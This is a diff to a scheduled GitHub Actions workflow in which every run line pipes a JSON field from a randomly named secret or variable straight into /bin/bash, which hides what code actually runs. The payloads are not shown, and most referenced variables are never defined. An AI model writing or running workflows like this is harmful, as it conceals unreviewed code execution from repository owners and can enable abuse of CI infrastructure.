@@ -2,23 +2,21 @@ name: shici1sc
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 5/6 * * *'
+    - cron: '6 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shici1sc
         env:
-          bjxyy5381: ${{ secrets.bjxyy5381 }}
+          capg4412: ${{ secrets.capg4412 }}
         run: |
-          echo $bjxyy5381 | jq -r .l184 | /bin/bash
-          echo $rqcp37367 | jq -r .s04506 | /bin/bash
-          echo $djq3 | jq -r .jd89 | /bin/bash
-          echo $t3294 | jq -r .rriir56995 | /bin/bash
-          echo $o65 | jq -r .bvt4583 | /bin/bash
-          echo $g6 | jq -r .cjds794 | /bin/bash
-          echo $jt0 | jq -r .eb40 | /bin/bash
-          echo $tahae05 | jq -r .kz37510 | /bin/bash
+          echo $capg4412 | jq -r .zff151 | /bin/bash
+          echo $zae67270 | jq -r .ojld477 | /bin/bash
+          echo $irc278 | jq -r .vmk13493 | /bin/bash
+          echo $l7285 | jq -r .myp1549 | /bin/bash
+          echo $cvey99087 | jq -r .iqnu71475 | /bin/bash
+          echo $parn9281 | jq -r .hdz7 | /bin/bash
 
